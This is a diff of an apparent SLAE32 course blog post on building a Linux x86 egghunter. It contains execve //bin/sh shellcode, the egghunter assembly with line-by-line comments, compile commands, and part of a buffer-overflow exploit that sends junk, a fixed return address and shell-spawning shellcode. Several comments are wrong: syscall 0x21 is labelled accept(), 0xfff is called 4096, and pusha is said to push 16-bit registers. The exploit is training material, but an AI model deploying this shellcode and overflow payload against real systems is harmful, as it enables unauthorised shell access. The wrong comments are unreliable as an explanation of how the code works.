@@ -17,6 +17,14 @@ tags:
 ---
 ![](/assets/images/SLAE32.png)
 
+## Overview
+For our fourth assignment in the SLAE32 course we were tasked with creating an egghunter.  
+_What is an Egg Hunter?_  
+An Egghunter is a piece of injectable shellcode that will search the memory of the running program for the a specific, larger payload. Once the Egghunter finds the larger payload, it will pass program control to it by executing it.  
+
+The larger payload that our Egghunter will search for and execute will be the `execve-stack` shellcode provided in the SLAE32 course.  
+
+#### Execve-Stach Assembly Code
 ```nasm
 ; Filename: execve-stack.nasm
 ; Author:  Vivek Ramachandran
@@ -31,53 +39,53 @@ global _start
 section .text
 _start:
 
-	xor eax, eax
-	push eax
-	push 0x68732f2f 	; PUSH //bin/sh (8 bytes) 
-	push 0x6e69622f
-	mov ebx, esp
-	push eax
-	mov edx, esp
-	push ebx
-	mov ecx, esp
-	mov al, 11
-	int 0x80
+xor eax, eax
+push eax
+push 0x68732f2f 	; PUSH //bin/sh (8 bytes) 
+push 0x6e69622f
+mov ebx, esp
+push eax
+mov edx, esp
+push ebx
+mov ecx, esp
+mov al, 11
+int 0x80
 ```
-This is the assembly code of the egghunter I created. It is heavily influenced by Skapes egghunter.  
 
-``nasm
+#### Egghunter Assembly Code
+
+```nasm
 global _start
 _start:
-        mov ebx, 0x50905090             ; EGG - 0x90 is NOP, 0x50 is push eax. Executable, no consequence instructions
-        xor ecx, ecx                    ; Clears the ECX Register.
-        mul ecx                                 ; ECX*EAX. Result is stored in EDX:EAX. This clears the EDX and EAX registers
-nextPage:                                       ; Increments the memory address stored in EDX by 4096 Bytes (a memory page)
-        or dx, 0xfff                    ; 0xfff = 4096. This is the size of Linux Memory pages.
-nextAddress:                            ; Increments the memory address stored in EDX by 4 Bytes (a memory address in IA-32 bit)
-        inc edx                                 ; in combo with the or dx above, this moves the memory scanner EDX by a page
-                                                        ; in combo with the cmp [edx+0x4] below, this aligns EDX so it will scan the next memory address
-                                                        ; 4095*2=8190+1=8191.
-        ;                                                    (inc edx) 4095+1    (inc edx) 8191+1
-        ; or dx when edx is: \x00000000                 \x00001000 = 4096       \x00002000 = 8192
-        ;                                        \x00000FFF                     \x00000FFF = 4095        \x00000FFF = 4095
-        ;                                        \x00000FFF = 4095  \x00001FFF = 8191   \x00002FFF = 12287
-        pusha                                   ; Pushes all 16-bit registers onto the stack
-        lea ebx, [edx+0x4]              ; Increments the Memory Address of EDX by 4 Bytes.
-                                                        ;  Stores the value stored at EDX+4 into the EBX register
-        mov al, 0x21                    ; System Call for accept()
-        int 0x80                                ; Executes accept()
-        cmp al, 0xf2                    ; The return value of accept() is stored in EAX. Checks if access is denied
-        popa                                    ; Pops all 16-bit registers from the stack
-        jz nextPage                             ; If page access is denied, check the next memory page
-        cmp [edx], ebx                  ;
-        jnz nextAddress
-        cmp [edx+0x4], ebx
-        jnz nextAddress
-        jmp edx
+mov ebx, 0x50905090   ; EGG - 0x90 is NOP, 0x50 is push eax. Executable, no consequence instructions
+xor ecx, ecx          ; Clears the ECX Register.
+mul ecx               ; ECX*EAX. Result is stored in EDX:EAX. This clears the EDX and EAX registers
+nextPage:             ; Increments the memory address stored in EDX by 4096 Bytes (a memory page)
+or dx, 0xfff          ; 0xfff = 4096. This is the size of Linux Memory pages.
+nextAddress:          ; Increments the memory address stored in EDX by 4 Bytes (a memory address in IA-32 bit)
+inc edx               ; in combo with the or dx above, this moves the memory scanner EDX by a page
+                      ; in combo with the cmp [edx+0x4] below, this aligns EDX so it will scan the next memory address
+                      ; 4095*2=8190+1=8191.
+                      ; (inc edx) 4095+1    (inc edx) 8191+1
+                      ; or dx when edx is: \x00000000         \x00001000 = 4096   \x00002000 = 8192
+                      ;                    \x00000FFF         \x00000FFF = 4095   \x00000FFF = 4095
+                      ;                    \x00000FFF = 4095  \x00001FFF = 8191   \x00002FFF = 12287
+pusha                 ; Pushes all 16-bit registers onto the stack
+lea ebx, [edx+0x4]    ; Increments the Memory Address of EDX by 4 Bytes.
+                      ;  Stores the value stored at EDX+4 into the EBX register
+mov al, 0x21          ; System Call for accept()
+int 0x80              ; Executes accept()
+cmp al, 0xf2          ; The return value of accept() is stored in EAX. Checks if access is denied
+popa                  ; Pops all 16-bit registers from the stack
+jz nextPage           ; If page access is denied, check the next memory page
+cmp [edx], ebx
+jnz nextAddress
+cmp [edx+0x4], ebx
+jnz nextAddress
+jmp edx
 ```
 
-I then comipled both the egghunter and the execve assembly code.  
-
+### Compiling the Egghunter and Execve-Stack Assembly Code  
 ```console
 nasm -f elf32 eggHunter.nasm -o eggHunter.o
 ld eggHunter.o -o eggHunter
@@ -205,7 +213,6 @@ EIP = '\xc0\xf4\xff\xbf'
 #EIP = 0xbffff4c0
 # root# ./objdump2hex.sh execve-stack
 payload = "\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";
-
 
 print junk + EIP + payload
 ```
